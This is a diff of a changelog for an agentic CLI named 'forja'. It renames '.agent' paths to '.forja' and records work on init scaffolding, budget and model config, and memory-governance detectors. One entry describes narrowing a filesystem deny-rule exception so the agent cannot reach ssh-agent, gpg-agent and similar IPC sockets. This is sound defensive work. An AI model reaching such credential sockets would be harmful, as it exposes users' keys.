+**2. Mid-loop failure pin for `scaffoldPlaybooks`.** Prior test coverage exercised the step-boundary failure (sentinel file at `.forja/playbooks` → mkdirSync ENOTDIR) but not within-loop. Inject scenario added: fixture with four entries where entry 3's `filename` points at a non-existent subdir (`missing-subdir/bad.md`). writeFileSync fails with ENOENT; the scaffolder early-returns. Pins assert: entries 1+2 wrote to final paths, entry 3 has no file (atomicWrite cleaned up its temp on write-throw), entry 4 was never attempted, stderr carries the diagnostic, no `.tmp-PID-TS` orphans linger anywhere in `.forja/playbooks/`. A refactor that loses the early-return (continuing past a single write failure) would silently turn this into "entries 1+2+4 wrote, error printed for 3" — caught here.
 
 **3. End-to-end eval — `evals/init/` + `tests/cli/init-eval.test.ts`.** Per `CLAUDE.md` principle 4 ("eval is load-bearing — a subsystem without eval doesn't ship"). Pre-eval, init's unit tests covered the scaffolder's outputs, and bootstrap's unit tests covered the loader's inputs, but no test pinned the **cross-subsystem handshake**: init writes the files; bootstrap reads them; the values flow through every loader correctly. Three scenarios:
 
 | # | Scenario | Pins |
 |---|---|---|
 | 1 | Default init (all 4 steps) → bootstrap | `permissionState === 'ready'`; `modelId === DEFAULT_MODEL`; `config.budget.maxSteps === DEFAULT_BUDGET.maxSteps`; memory + critique + providers warnings all empty |
-| 2 | `--only=permissions,config` (partial scaffold) → bootstrap | Boots to ready even without `.agent/agents/`; `[providers].model` still drives modelId resolution |
+| 2 | `--only=permissions,config` (partial scaffold) → bootstrap | Boots to ready even without `.forja/playbooks/`; `[providers].model` still drives modelId resolution |
 | 3 | Re-run idempotency | Second init prints "skipped"; permissions / config / gitignore / playbook content byte-for-byte unchanged; bootstrap still reaches ready against the unchanged scaffold |
 
 What the eval catches: schema drift between renderer and parser (init emits a key the loader's `BUDGET_INT_KEYS` doesn't recognize); path drift between `projectPolicyPath` / `projectAgentsDir` and bootstrap's read sites; value drift between scaffold and code defaults; partial-scaffold compatibility regression. What it doesn't: LLM behavior under the scaffolded model (covered by `tests/providers/*`), multi-operator concurrency (TOCTOU window narrowed by atomic-write but not eliminated), compiled-binary asset bundling (covered elsewhere). README at `evals/init/README.md`.
@@ -7351,9 +8655,9 @@ Suite delta: 152 tests pass across 5 affected files; typecheck + lint clean.
 
 ## [2026-05-19] fix(cli) — rich config.toml scaffold supersedes the slim spec-pointer
 
-Reverses the slim-scaffold posture from earlier in the day. Two days ago the analysis was: `/memory governance enable|disable` round-trips `.agent/config.toml` via `Bun.TOML.parse → mutate → emit` and comments don't survive — so shipping a comment-rich scaffold was a false promise. The fix at the time was to ship a minimal header pointing at `AGENTIC_CLI.md §2.1.1` for the schema.
+Reverses the slim-scaffold posture from earlier in the day. Two days ago the analysis was: `/memory governance enable|disable` round-trips `.forja/config.toml` via `Bun.TOML.parse → mutate → emit` and comments don't survive — so shipping a comment-rich scaffold was a false promise. The fix at the time was to ship a minimal header pointing at `AGENTIC_CLI.md §2.1.1` for the schema.
 
-The slim shape addressed the false-promise problem but introduced a new one: an operator who opens `.agent/config.toml` after `init` sees an essentially empty file and has no way to know what budget caps / model / governance toggles are in effect without grepping source. The "single source of truth" intuition surfaced via direct operator question ("can we remove DEFAULT_BUDGET? config should be the only place with values") and the steelman holds: values living in two places (code defaults + config.toml that may or may not declare them) is genuine cognitive overhead.
+The slim shape addressed the false-promise problem but introduced a new one: an operator who opens `.forja/config.toml` after `init` sees an essentially empty file and has no way to know what budget caps / model / governance toggles are in effect without grepping source. The "single source of truth" intuition surfaced via direct operator question ("can we remove DEFAULT_BUDGET? config should be the only place with values") and the steelman holds: values living in two places (code defaults + config.toml that may or may not declare them) is genuine cognitive overhead.
 
 **New shape.** The scaffold contains **active TOML values for all four operator-tunable sections** (`[providers]`, `[budget]`, `[memory]`, `[critique]`) sourced from the canonical code defaults at scaffold time. No comments anywhere in the file — because comments still die on `/memory governance` round-trip, but values survive. The operator opens `config.toml` and sees the running config literally:
 
@@ -7382,9 +8686,9 @@ max_overhead_ms = 5000
 
 **What stays hardcoded.** `DEFAULT_BUDGET` / `DEFAULT_MEMORY_CONFIG` / `DEFAULT_CRITIQUE_CONFIG` / `DEFAULT_MODEL` remain in code as a **safety floor**: fresh install before any `init`, programmatic test seams that don't construct a config loader, subagent runs that resolve config through the parent's audit snapshot path. The user's original instinct "remove DEFAULT_BUDGET entirely" was rejected explicitly — a fresh install with no config.toml + no DEFAULT_BUDGET would run with NO step backstop, NO cost cap, NO wall-clock cap. The "fresh install has no caps" failure mode is exactly the runaway-loop scenario `maxSteps: 200` exists to prevent.
 
-**Trade-off accepted: sticky defaults.** An operator who ran `forja init` on version N and then upgrades to version N+1 keeps their scaffolded values from version N until they re-run `agent init --force=config`. This is a real cost — we documented it inline in `src/providers/default-model.ts` and in the BACKLOG. The mitigating factor: bumps to canonical defaults are deliberate per-release moves (not bug fixes), and re-running `init --force=config` is a single, advertised step.
+**Trade-off accepted: sticky defaults.** An operator who ran `forja init` on version N and then upgrades to version N+1 keeps their scaffolded values from version N until they re-run `forja init --force=config`. This is a real cost — we documented it inline in `src/providers/default-model.ts` and in the BACKLOG. The mitigating factor: bumps to canonical defaults are deliberate per-release moves (not bug fixes), and re-running `init --force=config` is a single, advertised step.
 
-**DEFAULT_MODEL extracted.** Moved from `src/cli/bootstrap.ts:77` (whose transitive closure includes storage, providers, hooks, telemetry) to a tiny dependency-free `src/providers/default-model.ts`. The `agent init` path now imports the model string without pulling in `bootstrap.ts`. `bootstrap.ts` re-exports for backward-compat with consumer code that imports `DEFAULT_MODEL` from there.
+**DEFAULT_MODEL extracted.** Moved from `src/cli/bootstrap.ts:77` (whose transitive closure includes storage, providers, hooks, telemetry) to a tiny dependency-free `src/providers/default-model.ts`. The `forja init` path now imports the model string without pulling in `bootstrap.ts`. `bootstrap.ts` re-exports for backward-compat with consumer code that imports `DEFAULT_MODEL` from there.
 
 **Spec edits** (`docs/spec/AGENTIC_CLI.md §2.1.1`):
 
@@ -7400,15 +8704,15 @@ max_overhead_ms = 5000
 - `tests/cli/init.test.ts` config-step assertions updated: drop the `'AGENTIC_CLI.md §2.1.1'`/`'parses to empty'`/`'spec-pointer'` checks; add `parsed.providers/budget/memory/critique` defined checks; add a comment-rejection pin.
 - 147 tests pass across the four affected test files; typecheck + lint clean.
 
-**Production-readiness shift.** Operator UX improves on the "what's actually configured here?" axis — answer is now "open `.agent/config.toml`, that's everything". Cognitive load drops one indirection. The "two sources of truth" residual concern (code default + scaffold value) is real but bounded: `DEFAULT_*` constants are the source of truth for scaffold values, and `init --force=config` re-syncs. The path "delete a line → no cap" still doesn't work (loader falls back to `DEFAULT_BUDGET`); the "no cap" semantic stays slash-only (`/budget cost off`, session-scoped) until a future slice adds an explicit `[budget].disable_cost_cap` or `-1` sentinel — deliberately out of scope for this slice.
+**Production-readiness shift.** Operator UX improves on the "what's actually configured here?" axis — answer is now "open `.forja/config.toml`, that's everything". Cognitive load drops one indirection. The "two sources of truth" residual concern (code default + scaffold value) is real but bounded: `DEFAULT_*` constants are the source of truth for scaffold values, and `init --force=config` re-syncs. The path "delete a line → no cap" still doesn't work (loader falls back to `DEFAULT_BUDGET`); the "no cap" semantic stays slash-only (`/budget cost off`, session-scoped) until a future slice adds an explicit `[budget].disable_cost_cap` or `-1` sentinel — deliberately out of scope for this slice.
 
 ## [2026-05-19] feat(cli + permissions) — three operator-tunable knobs no longer hardcoded
 
 Audit of `src/` for `MAX_*`, `DEFAULT_*` constants and hardcoded model ids surfaced ~17 candidates; 3 had high signal for operator override and no existing per-project path. Cargo-cult risk acknowledged — the remaining 14 (subagent depth, IPC caps, retention windows, harness concurrency caps, …) are safety/protocol/internal-tuning constants and stay in code.
 
-**Knob 1 — `[providers] model` in `.agent/config.toml`.** Pin executor model per-project. Resolution chain: CLI flag `--model` > project `[providers].model` > user `[providers].model` > `DEFAULT_MODEL` (`anthropic/claude-opus-4-7`). Unknown model id in config → warning + fall back to default (matches `[critique].model` posture). Surfaced via new `loadProvidersConfig` mirroring the existing critique/memory loader shape. Bootstrap reorder: `projectConfigCwd` resolved EARLY so providers loader runs before `modelId` resolution.
+**Knob 1 — `[providers] model` in `.forja/config.toml`.** Pin executor model per-project. Resolution chain: CLI flag `--model` > project `[providers].model` > user `[providers].model` > `DEFAULT_MODEL` (`anthropic/claude-opus-4-7`). Unknown model id in config → warning + fall back to default (matches `[critique].model` posture). Surfaced via new `loadProvidersConfig` mirroring the existing critique/memory loader shape. Bootstrap reorder: `projectConfigCwd` resolved EARLY so providers loader runs before `modelId` resolution.
 
-**Knob 2 — `[budget]` section in `.agent/config.toml`.** Six keys exposed (`max_steps`, `max_cost_usd`, `max_wall_clock_ms`, `max_step_stall_ms`, `compaction_threshold`, `compaction_preserve_tail`). Per-key merge: project overrides user, CLI `input.budget` overrides both; absent fields inherit `DEFAULT_BUDGET` from `src/harness/types.ts` (harness applies the final merge). Per-key validators reject non-finite numbers, non-integers in integer fields, out-of-range values; fail-soft (warning + ignore the offending field, not the whole layer). camelCase aliases accepted for copy-paste from harness API docs.
+**Knob 2 — `[budget]` section in `.forja/config.toml`.** Six keys exposed (`max_steps`, `max_cost_usd`, `max_wall_clock_ms`, `max_step_stall_ms`, `compaction_threshold`, `compaction_preserve_tail`). Per-key merge: project overrides user, CLI `input.budget` overrides both; absent fields inherit `DEFAULT_BUDGET` from `src/harness/types.ts` (harness applies the final merge). Per-key validators reject non-finite numbers, non-integers in integer fields, out-of-range values; fail-soft (warning + ignore the offending field, not the whole layer). camelCase aliases accepted for copy-paste from harness API docs.
 
 **Knob 3 — `tools.fetch_url.trusted_hosts` in `permissions.yaml`.** Additive over `DEFAULT_TRUSTED_HOSTS` (`risk-score.ts` — github + 5 public registries). Hosts listed in policy do NOT trigger the `untrusted_egress` risk-score feature for this project — useful for internal CDNs, GitHub Enterprise, or any endpoint outside the public default. NOT an allowlist (deny_hosts still wins). Bootstrap merges policy-supplied entries with the default list (dedupe via `Array.from(new Set(...))` so a policy that re-lists `github.com` doesn't inflate the iteration set). Init template scaffolds an empty `trusted_hosts: []` block with explanatory comment.
 
@@ -7455,11 +8759,11 @@ Suite delta: 206 pass across 4 affected files (config-loader +15, permissions/co
 
 ## [2026-05-19] fix(cli) — slim the scaffolded `config.toml` to a spec-pointer
 
-In-flight regression in the unified-init slice surfaced during review of the post-work entry below. The rich 30-line `config.toml` template that `agent init` shipped (per the earlier §2.1.1 schema) **looked like inline documentation but was a false promise**: `/memory governance enable|disable verify|conflict|override|all` rewrites the file via `Bun.TOML.parse → mutate → emitTomlDoc` (`src/cli/slash/commands/memory.ts:3118-3181`), and Bun's TOML parser does not preserve comments. The first slash-command toggle would silently delete every line of the scaffolded inline doc — exactly when the operator first acted on the file they had just learned to read.
+In-flight regression in the unified-init slice surfaced during review of the post-work entry below. The rich 30-line `config.toml` template that `forja init` shipped (per the earlier §2.1.1 schema) **looked like inline documentation but was a false promise**: `/memory governance enable|disable verify|conflict|override|all` rewrites the file via `Bun.TOML.parse → mutate → emitTomlDoc` (`src/cli/slash/commands/memory.ts:3118-3181`), and Bun's TOML parser does not preserve comments. The first slash-command toggle would silently delete every line of the scaffolded inline doc — exactly when the operator first acted on the file they had just learned to read.
 
 **Fix.** Slim the scaffolded `config.toml` to a 13-line spec-pointer header. Discovery moves from the file to `AGENTIC_CLI.md §2.1.1`, which now splits explicitly into:
 
-1. **Scaffold literal** — the exact 13-line slim header that `agent init` writes. The spec block here matches the renderer byte-for-byte (pinned by the snapshot/contains tests).
+1. **Scaffold literal** — the exact 13-line slim header that `forja init` writes. The spec block here matches the renderer byte-for-byte (pinned by the snapshot/contains tests).
 2. **Schema reference** — a separate code block listing every available toggle (`[memory]` 3 detectors, `[critique]` 4 keys) with example values, marked as descriptive (not what's in the file).
 
 **Behavioral promise the slim scaffold can keep:** the scaffolded file's comments inform the operator (a) where the schema lives (spec link inline), (b) that the file is empty by design, (c) that `/memory governance` round-trips and loses comments — so the operator decides BEFORE a toggle whether to keep hand-edits inline. The slash-command path's existing parse-emit round-trip stays untouched.
@@ -7474,16 +8778,16 @@ The slim scaffold buys back the discovery layer at the cost of one extra click (
 
 **Tests rewritten:** `tests/cli/init-config-template.test.ts` drops the per-section/per-key `toContain` assertions (those would couple the test to inline schema content the slim scaffold deliberately omits) and adds `toContain('comments NOT preserved')` to pin the round-trip warning. `tests/cli/init.test.ts` config-step assertions adapted: `[memory]`/`[critique]` checks dropped in favor of empty-TOML-parse + spec-ref-presence. 186 tests pass across affected files; typecheck + lint clean.
 
-## [2026-05-19] feat(cli) — unified `agent init` scaffolding (post-work)
+## [2026-05-19] feat(cli) — unified `forja init` scaffolding (post-work)
 
 Closes the pre-work entry below. Two commits on `feat/init-unified-scaffold`:
 
 | Commit | Class | Subsystem | One-liner |
 |---|---|---|---|
-| `47080c5` | docs | spec | widen `agent init` to scaffold the four bootstrap artifacts |
-| `4bca315` | feat | cli | unify `agent init` scaffold across four bootstrap artifacts |
+| `47080c5` | docs | spec | widen `forja init` to scaffold the four bootstrap artifacts |
+| `4bca315` | feat | cli | unify `forja init` scaffold across four bootstrap artifacts |
 
-**Outcome.** One `agent init` invocation now writes all four `.agent/` artifacts (`permissions.yaml`, `.gitignore`, `config.toml`, 10 canonical playbooks) instead of the prior two-invocation dance (`init` then `init --playbooks`). Each step is idempotent (skip-if-exists), so re-runs after partial failure or after `git pull` are safe and operator hand-edits survive. The operator-facing surface gained `--only=csv` (subset selection) and `--force[=csv]` (bare = `'all'`; CSV = subset of force-eligible steps), and lost `--playbooks` (legacy flag explicitly rejected with a pointer to `--only=playbooks`).
+**Outcome.** One `forja init` invocation now writes all four `.forja/` artifacts (`permissions.yaml`, `.gitignore`, `config.toml`, 10 canonical playbooks) instead of the prior two-invocation dance (`init` then `init --playbooks`). Each step is idempotent (skip-if-exists), so re-runs after partial failure or after `git pull` are safe and operator hand-edits survive. The operator-facing surface gained `--only=csv` (subset selection) and `--force[=csv]` (bare = `'all'`; CSV = subset of force-eligible steps), and lost `--playbooks` (legacy flag explicitly rejected with a pointer to `--only=playbooks`).
 
 **Decisions that survived the in-flight review:**
 
@@ -7501,33 +8805,33 @@ Closes the pre-work entry below. Two commits on `feat/init-unified-scaffold`:
 
 **Items flagged in review and intentionally NOT addressed:**
 
-- **TOCTOU between `existsSync` and `writeFileSync` in `scaffoldPermissions` / `scaffoldConfig`.** `ensureAgentGitignore` uses `wx` (atomic create-or-fail); the other two use the check-then-write pattern. Fixing would require either splitting the force path from the create path (two writeFileSync calls per step) or switching to `wx`-then-`w`-fallback. Mitigation: operators don't run two `agent init` concurrently; concern is theoretical for the use case. Documented inline.
+- **TOCTOU between `existsSync` and `writeFileSync` in `scaffoldPermissions` / `scaffoldConfig`.** `ensureAgentGitignore` uses `wx` (atomic create-or-fail); the other two use the check-then-write pattern. Fixing would require either splitting the force path from the create path (two writeFileSync calls per step) or switching to `wx`-then-`w`-fallback. Mitigation: operators don't run two `forja init` concurrently; concern is theoretical for the use case. Documented inline.
 - **`--force=all` rejected with "valid: permissions, config, playbooks" instead of being a synonym for bare `--force`.** Operator with muscle memory may try `--force=all` expecting it to work. Trade-off: special-casing `all` adds a parser branch + spec wording exception. Leaving as-is; the error message is clear.
 - **`scaffoldPermissions` and `scaffoldConfig` have near-identical 60-line bodies.** Two usages don't amortize a `scaffoldFileTemplate` helper. If a 3rd file-template step lands (`hooks.toml`?), refactor then.
-- **Mid-loop failure inside `scaffoldPlaybooks` not test-covered.** The partial-failure test exercises step-boundary failure (sentinel file at `.agent/agents` → mkdirSync ENOTDIR). Within-step partial failure (e.g., entry 5 of 10 throws on writeFileSync) is harder to inject without mocking fs and isn't covered. Behavior on this path: aggregate summary suppressed (early-return), per-file output already streamed, exit 1, operator re-runs.
+- **Mid-loop failure inside `scaffoldPlaybooks` not test-covered.** The partial-failure test exercises step-boundary failure (sentinel file at `.forja/playbooks` → mkdirSync ENOTDIR). Within-step partial failure (e.g., entry 5 of 10 throws on writeFileSync) is harder to inject without mocking fs and isn't covered. Behavior on this path: aggregate summary suppressed (early-return), per-file output already streamed, exit 1, operator re-runs.
 
 **Spec edits** (`docs/spec/`):
 
 - `AGENTIC_CLI.md §2.1` — `init` table row broadened; new `§2.1.1` defines the scaffolded `config.toml` schema with worked example.
 - `AGENTIC_CLI.md §8` — bootstrap-path paragraph extended; explicit note that `.gitignore` is operator-owned post-creation and rejected from `--force`.
 - `MEMORY.md §2.5` — `.gitignore` ownership moved from "first invocation" to "init scaffold step"; idempotency + never-overwrite semantics preserved; regeneration path documented.
-- `PLAYBOOKS.md` — new `§12` documenting bundled distribution (canonical 10 copied to `.agent/agents/`, idempotent per file, `--force=playbooks` overwrite path, customization disjointness rule). Existing `§12–§15` renumbered to `§13–§16`. Cross-refs in `src/cli/init.ts:3` and `src/cli/init-playbooks/index.ts:1` updated.
+- `PLAYBOOKS.md` — new `§12` documenting bundled distribution (canonical 10 copied to `.forja/playbooks/`, idempotent per file, `--force=playbooks` overwrite path, customization disjointness rule). Existing `§12–§15` renumbered to `§13–§16`. Cross-refs in `src/cli/init.ts:3` and `src/cli/init-playbooks/index.ts:1` updated.
 
 **Test deltas.** `tests/cli/init.test.ts` rewritten in 5 describe blocks (permissions / gitignore / config / playbooks / full-bundle); `tests/cli/init-config-template.test.ts` new (6 cases — TOML validity, empty-parse pin, section/key presence, spec ref, trailing newline); `tests/cli/args.test.ts` init describe expanded (15 → 19 cases including `--force` shapes, `--only` shapes, dedup, drift guard, legacy `--playbooks` rejection, `--force=gitignore` rejection). 186 tests pass across the three files; typecheck + lint clean.
 
-**Production-readiness shift.** Before: first-time operator had to run `init` twice (permissions, then `--playbooks`) and still got `.agent/config.toml` only by grepping source. After: one invocation scaffolds the entire bootstrap bundle; `config.toml` documents every available toggle in the file itself; granular re-copy (`--only`) and overwrite (`--force[=csv]`) cover the maintenance flows; idempotent re-runs are safe by default.
+**Production-readiness shift.** Before: first-time operator had to run `init` twice (permissions, then `--playbooks`) and still got `.forja/config.toml` only by grepping source. After: one invocation scaffolds the entire bootstrap bundle; `config.toml` documents every available toggle in the file itself; granular re-copy (`--only`) and overwrite (`--force[=csv]`) cover the maintenance flows; idempotent re-runs are safe by default.
 
-## [2026-05-19] feat(cli) — unify `agent init` scaffolding (pre-work plan)
+## [2026-05-19] feat(cli) — unify `forja init` scaffolding (pre-work plan)
 
-`agent init` today scaffolds exactly one artifact: `.agent/permissions.yaml`. The `--playbooks` flag is mutually exclusive — it instead copies the 10 canonical playbooks under `.agent/agents/`. A first-time operator on a fresh repo therefore has to run `agent init` TWICE (once for permissions, once for playbooks) and still doesn't get `.agent/.gitignore` (auto-generated lazily by the memory subsystem on first session via `ensureAgentGitignore` in `src/memory/gitignore.ts:47`) or `.agent/config.toml` (no scaffolder exists; the file is "optional" but governance toggles + critique config live there and without it the operator can't discover the schema short of grepping the source).
+`forja init` today scaffolds exactly one artifact: `.forja/permissions.yaml`. The `--playbooks` flag is mutually exclusive — it instead copies the 10 canonical playbooks under `.forja/playbooks/`. A first-time operator on a fresh repo therefore has to run `forja init` TWICE (once for permissions, once for playbooks) and still doesn't get `.forja/.gitignore` (auto-generated lazily by the memory subsystem on first session via `ensureAgentGitignore` in `src/memory/gitignore.ts:47`) or `.forja/config.toml` (no scaffolder exists; the file is "optional" but governance toggles + critique config live there and without it the operator can't discover the schema short of grepping the source).
 
-This slice unifies the scaffold: one `agent init` writes all four artifacts — `permissions.yaml`, `.gitignore`, `config.toml`, and the 10 playbooks — each step idempotent (skip-if-exists) so reruns don't clobber operator edits. `--playbooks` is removed; granularity moves to `--only=<csv>` (subset of the four steps) and `--force[=csv]` (overwrite all or a subset).
+This slice unifies the scaffold: one `forja init` writes all four artifacts — `permissions.yaml`, `.gitignore`, `config.toml`, and the 10 playbooks — each step idempotent (skip-if-exists) so reruns don't clobber operator edits. `--playbooks` is removed; granularity moves to `--only=<csv>` (subset of the four steps) and `--force[=csv]` (overwrite all or a subset).
 
 **Phase 0 — Spec PR (mandatory first per `CLAUDE.md` hard rule "Diverging from the spec requires a PR against the spec first, code after").**
 
-- `AGENTIC_CLI.md §2.1` — broaden `agent init` table row; document `--only=<csv>` and `--force[=csv]`; remove `--playbooks` from the synopsis. Update the bootstrap-path paragraph in §8 (which currently says "`agent init` … generates a baseline `permissions.yaml`") to mention the three additional artifacts.
-- `MEMORY.md §2.5` — move `.gitignore` ownership from "first invocation" to "`agent init` scaffold step". Semantics stay (idempotent; operator-owned after creation; agent never overwrites).
-- `PLAYBOOKS.md` — new §12 documenting bundled distribution via `agent init` (canonical 10 copied to `.agent/agents/`, idempotent per file, `--force=playbooks` overwrite path, customization disjointness rule). Renumber existing §12–15 to §13–16.
+- `AGENTIC_CLI.md §2.1` — broaden `forja init` table row; document `--only=<csv>` and `--force[=csv]`; remove `--playbooks` from the synopsis. Update the bootstrap-path paragraph in §8 (which currently says "`forja init` … generates a baseline `permissions.yaml`") to mention the three additional artifacts.
+- `MEMORY.md §2.5` — move `.gitignore` ownership from "first invocation" to "`forja init` scaffold step". Semantics stay (idempotent; operator-owned after creation; agent never overwrites).
+- `PLAYBOOKS.md` — new §12 documenting bundled distribution via `forja init` (canonical 10 copied to `.forja/playbooks/`, idempotent per file, `--force=playbooks` overwrite path, customization disjointness rule). Renumber existing §12–15 to §13–16.
 - New subsection (in `AGENTIC_CLI.md §2.1` or §3) defining the scaffolded `config.toml` schema: `[memory]` (3 governance toggles: `verify_semantic_llm`, `conflict_detect_llm`, `override_detect_llm`) + `[critique]` (`mode`, `threshold`, `model`, `prompt_version`), all entries commented so the file is a no-op until the operator edits.
 
 **Phase 1 — Config template.** New `src/cli/init-config-template.ts` mirroring `init-template.ts`. Header comment + spec ref. `[memory]` and `[critique]` sections with every key commented and a short explanation per key. Snapshot test + `Bun.TOML.parse` validation pinning that the rendered file parses as valid TOML (and that the commented form produces empty parsed sections).
@@ -7573,7 +8877,7 @@ Third pass of code review over the post-S3 memory governance, plus one finding o
 
 - **Edge cases in concurrent / TOCTOU paths.** `c21a279` fixed the conflict dispatcher silently dispatching against a stale snapshot when `registry.peek` returned non-present for either pair member — the operator deleted a memory between scheduler peek and dispatch, but the LLM judge still ran and landed a quarantine proposal for the gone memory. Mirror of the S3 `target_gone` path now wired through the conflict scheduler.
 
-- **NDJSON pollution.** `ed6989a` fixed the recap CLI path not propagating `--json` into the bootstrap, so `agent recap --json` first-boot consumers saw the governance banner pollute their stream (the main run path already piped json through; the recap branch was missed).
+- **NDJSON pollution.** `ed6989a` fixed the recap CLI path not propagating `--json` into the bootstrap, so `forja recap --json` first-boot consumers saw the governance banner pollute their stream (the main run path already piped json through; the recap branch was missed).
 
 - **Permissions surface mis-narrowing (off-memory).** `d22a143` was the one finding outside the memory subsystem. `SYSTEM_DENY_EXCEPTIONS = ['/run/media', '/run/user']` re-admitted ALL paths under `/run/user/<uid>`, including ssh-agent / gpg-agent sockets, user dbus, container engines, Wayland, etc. — exactly the IPC surface the `/run` deny tier was meant to block. Carve-out narrowed via a `XDG_RUNTIME_SOCKET_SEGMENTS` denylist matching the first segment after the uid directory; regular files under `$XDG_RUNTIME_DIR/<app>/` still pass.
 
@@ -7685,7 +8989,7 @@ Six commits delivered across the slice, all on `feat/memory-governance-llm`:
 **Architectural posture.** All four detectors (S11 + S13 + S3 + trust_revoked) wired with the same shape:
 
 - **Propose-not-mutate** — every detector emits to `memory_governance_proposals`; only `applyProposal` calls `transitionMemoryState`; only after the operator approves through `/memory governance approve` does memory state change.
-- **Default ON with three-layer opt-out** — CLI flag > project config (`.agent/config.toml [memory]`) > user config (`~/.config/agent/config.toml [memory]`) > hardcoded default. First-boot stderr banner once, then silent.
+- **Default ON with three-layer opt-out** — CLI flag > project config (`.forja/config.toml [memory]`) > user config (`~/.config/forja/config.toml [memory]`) > hardcoded default. First-boot stderr banner once, then silent.
 - **Cost-bounded** — per-session dispatch + cost caps (10 dispatches / $0.50) per detector with per-dispatch headroom check. Cap-latch is sticky (`capExhausted` field on `getCounters()`); follow-up TODO entry tracks "push notification when latched" since today the cap-latch state is pull-only via `/memory governance status`.
 - **Isolated subagents** — `parentApprovalId: null`, new session id, capability envelope intersected with parent's, structured output schema validated before any persisted side effects. `PROTECTED_BUILTIN_NAMES` surfaces project/user shadows in the loader so a malicious override doesn't silently widen the tools[] envelope.
 - **Cooldown / dedup substrate** — each detector has its own attempts table (memory_verify_attempts / memory_conflict_attempts / memory_verify_override_attempts) keyed on `content_hash`; rebuild on operator edit; 7d window for verify-semantic + verify-conflict (high-stakes verdicts re-dispatch), 24h cooldown for verify-override (both verdicts dedup because the pending-proposal gate upstream prevents queue duplicates).
@@ -7701,7 +9005,7 @@ Three parallel reviewers on the Slice Q diff surfaced 5 CRIT + 14 HIGH + ~16 MED
 
 **R2 (B-CRIT-3 + A-M5) — first-boot banner suppression.** Banner now respects `--json` mode (NDJSON consumers expect predictable stderr) AND a per-machine marker at `~/.local/share/forja/.governance-banner-shown`. `BootstrapInput.governanceBannerMarkerDir?: string | null` for test injection (`null` disables marker entirely, useful for CI determinism). Default location uses `homedir()`. Errors writing marker degrade silently to "emit anyway" (better than suppressing a banner the operator never saw).
 
-**R3 (A-H1/2/3 + A-M1/4) — `mutateMemoryConfig` round-trip.** Pre-fix was text-level extract-and-replace of the `[memory]` block via section-header regex; defeated by multi-line basic strings (embedded `[memory]` lookalike), quoted-key tables, whitespace inside `[ memory ]`, BOM, CRLF, and `lastIndexOf('/')` on Windows. Refactored to `Bun.TOML.parse(raw) → mutate object → emit canonical` via a 40-line TOML emitter handling scalars + flat tables (exhaustive for `.agent/config.toml`'s schema; extends naturally if a future subsystem adds nested tables). Trade-off (lose comments + original whitespace) documented in code. `dirname()` for Windows compat; require() hoisted to top-level imports.
+**R3 (A-H1/2/3 + A-M1/4) — `mutateMemoryConfig` round-trip.** Pre-fix was text-level extract-and-replace of the `[memory]` block via section-header regex; defeated by multi-line basic strings (embedded `[memory]` lookalike), quoted-key tables, whitespace inside `[ memory ]`, BOM, CRLF, and `lastIndexOf('/')` on Windows. Refactored to `Bun.TOML.parse(raw) → mutate object → emit canonical` via a 40-line TOML emitter handling scalars + flat tables (exhaustive for `.forja/config.toml`'s schema; extends naturally if a future subsystem adds nested tables). Trade-off (lose comments + original whitespace) documented in code. `dirname()` for Windows compat; require() hoisted to top-level imports.
 
 **R4 (C-CRIT-1 + C-CRIT-2) — bootstrap end-to-end tests.** New `tests/cli/bootstrap-memory-defaults.test.ts` (+8 tests): fresh-repo defaults ON via source=`'default'`, first-boot banner emits with marker creation, second-boot stays silent (marker gate), `--json` suppresses banner without writing marker, explicit CLI override bumps source to `'cli'`, project/user config sets `'project-config'`/`'user-config'` source, project wins over user when both touch verify, marker dir=null disables marker (banner re-fires every boot).
 
@@ -7717,13 +9021,13 @@ Three parallel reviewers on the Slice Q diff surfaced 5 CRIT + 14 HIGH + ~16 MED
 
 ## [2026-05-18] feat(memory) — Slice Q: invert S11+S13 LLM-judge default to ON; opt-out via slash + per-project config
 
-Operator decision: the two LLM-judge detectors (`verify_failed` / S11, `conflict_detected` / S13) inverted from default OFF to default ON. Cost not a limitation; coverage is. Opt-out via slash command persisted per-project — mirroring the `[critique]` precedent in `.agent/config.toml`.
+Operator decision: the two LLM-judge detectors (`verify_failed` / S11, `conflict_detected` / S13) inverted from default OFF to default ON. Cost not a limitation; coverage is. Opt-out via slash command persisted per-project — mirroring the `[critique]` precedent in `.forja/config.toml`.
 
 **Resolved precedence chain** (boot-time, first-match wins):
 
 1. CLI flag explicit (`--memory-verify-llm` / `--no-memory-verify-llm` ditto for conflict). Session-only.
-2. Project config `.agent/config.toml [memory] verify_semantic_llm = false`.
-3. User config `~/.config/agent/config.toml [memory] verify_semantic_llm = false`.
+2. Project config `.forja/config.toml [memory] verify_semantic_llm = false`.
+3. User config `~/.config/forja/config.toml [memory] verify_semantic_llm = false`.
 4. **Default ON** (the new default).
 
 Shipped (Q1-Q7):
@@ -7732,9 +9036,9 @@ Shipped (Q1-Q7):
 - **Q2**: `loadMemoryConfig` in `src/critique/config-loader.ts` reusing `userConfigPath` / `projectConfigPath` / fail-soft warnings. Returns `{config, userHadField, projectHadField, warnings, paths}` — provenance signals drive banner suppression. snake_case + camelCase aliases.
 - **Q3**: bootstrap integration. `HarnessConfig.memorySemanticVerify`/`memoryConflictDetect` (still optional in type for fixture compat); `HarnessConfig.memorySemanticVerifySource`/`memoryConflictDetectSource` provenance fields. Boot banner: when BOTH resolve to ON via default + CLI absent → single stderr line `memory: governance LLM detectors enabled by default ... Disable: /memory governance disable verify|conflict|all`. Subagent context naturally suppresses (subagent-child has its own boot path).
 - **Q4**: CLI `--no-memory-verify-llm` / `--no-memory-conflict-llm` siblings. Mutual-exclusion guard: `--x` + `--no-x` in same argv → parse error. F12 mirror extended to refuse either polarity in subagent context. `run.ts` propagates both `true` and `false` (semantic: `undefined` = no CLI override).
-- **Q5**: `/memory governance enable|disable verify|conflict|all` slash subcommands. Text-level `[memory]` block extract-and-replace (preserves `[critique]` + comments). Atomic tmp+rename. Creates `.agent/` + file if absent. Replaces in-place when block exists (no duplicate).
+- **Q5**: `/memory governance enable|disable verify|conflict|all` slash subcommands. Text-level `[memory]` block extract-and-replace (preserves `[critique]` + comments). Atomic tmp+rename. Creates `.forja/` + file if absent. Replaces in-place when block exists (no duplicate).
 - **Q6**: harness loop comments updated (linhas 1074, 1082) reflect new opt-out path; stderr messages dropped flag-specific suffixes since the flag is now optional.
-- **Q7**: `/memory governance status` enabled-state strings use source provenance: `yes (default; disable: ...)`, `yes (.agent/config.toml)`, `yes (--memory-verify-llm)`, `no (.agent/config.toml)`, `no (--no-memory-verify-llm)`, etc.
